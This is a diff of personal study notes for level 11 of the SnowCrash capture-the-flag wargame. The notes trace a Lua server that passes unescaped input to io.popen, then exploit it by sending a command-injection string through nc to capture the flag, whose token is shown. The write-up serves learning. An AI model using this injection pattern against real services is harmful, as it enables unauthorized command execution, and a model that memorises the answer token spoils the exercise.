@@ -12,7 +12,7 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 # Lets see what happens when running the file
 
 level11@SnowCrash:~$ ./level11.lua
-lua: ./level11.lua:3: address already in use
+lua: ./level11.lua:3: address already in use			# We can see that it is running 
 stack traceback:
 	[C]: in function 'assert'
 	./level11.lua:3: in main chunk
@@ -23,11 +23,11 @@ stack traceback:
 level11@SnowCrash:~$ vim level11.lua
 
   1 #!/usr/bin/env lua
-  2 local socket = require("socket")
-  3 local server = assert(socket.bind("127.0.0.1", 5151))
+  2 local socket = require("socket")								# this is important
+  3 local server = assert(socket.bind("127.0.0.1", 5151))			# this is important 
   4
   5 function hash(pass)
-  6   prog = io.popen("echo "..pass.." | sha1sum", "r")
+  6   prog = io.popen("echo "..pass.." | sha1sum", "r")				# This is the exploit
   7   data = prog:read("*all")
   8   prog:close()
   9
@@ -66,15 +66,12 @@ level11@SnowCrash:~$ vim level11.lua
 	Starts program prog in a separated process and returns a file handle that you can use to read data from this program 
 	(if mode is "r", the default) or to write data to this program (if mode is "w"). 
 
-# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
+# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too
 #	Note localhost 5151 is home in networking
 echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
 
 level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
 Password: Erf nope..
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-
-level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
 # Below is another method for solving the same problem.
@@ -87,10 +84,13 @@ Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
 Erf nope..
 
-# We completely by passed the flag here and got it without cracking it but through an echo exploit that I used in 10 and it wasn't the correct.
-	But it worked for this level11 
+# Note wall writes to all terminals 
+
+# What we learnt 
+# this was a echo exploit and wall is awesome 
 
 
 Resources
 http://pgl.yoyo.org/luai/i/io.popen
+https://en.wikipedia.org/wiki/Wall_(Unix)
 https://stackoverflow.com/questions/5239317/io-popen-how-to-wait-for-process-to-finish-in-lua
